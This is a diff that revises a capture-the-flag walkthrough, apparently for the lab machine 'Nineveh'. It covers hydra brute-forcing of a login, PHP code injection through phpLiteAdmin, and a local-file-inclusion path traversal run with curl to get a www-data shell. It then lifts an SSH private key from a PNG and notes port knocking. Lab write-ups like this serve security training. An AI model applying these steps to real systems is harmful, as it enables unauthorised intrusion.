@@ -36,9 +36,9 @@ ffuf -u https://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory
 
 ## Access
 
-1. **Brute force** the `/department` login (user `admin`) with `hydra`.
-2. **phpLiteAdmin** at `/db/index.php`: the default password is `password`, and the version lets you create a `.php` database containing code.
-3. **LFI**: `manage.php?notes=` includes files; `/ninevehNotes.txt/../../tmp/<shell>.php` executes the created PHP.
+1. **Brute force** the `/department` login (user `admin`; the password falls to rockyou, and the page source carries a comment signed by `amrois`).
+2. **phpLiteAdmin 1.9** at `/db/index.php`: its password also falls to rockyou and is **not** the default one; the version lets you create a `.php` database containing code.
+3. **LFI**: `manage.php?notes=` includes files but requires the path to contain `ninevehNotes`; `/ninevehNotes.txt/../../tmp/<shell>.php` (or `/ninevehNotes.txt/../../../var/tmp/<shell>.php`) executes the created PHP.
 4. **`www-data`**.
 
 ```bash
@@ -47,7 +47,7 @@ curl -k "https://<IP>/department/manage.php?notes=/ninevehNotes.txt/../../tmp/x.
 
 ## Escalation
 
-- **`amrois`**: the `secure_notes` image hides a private SSH key (`steghide`/`strings`/`binwalk` depending on the file).
+- **`amrois`**: `https://<IP>/secure_notes/nineveh.png` carries a private RSA key pasted into the PNG itself: `strings nineveh.png` returns it directly.
 - **SSH closed**: `ps auxww` shows `knockd`; `/etc/knockd.conf` says:
 
 ```text
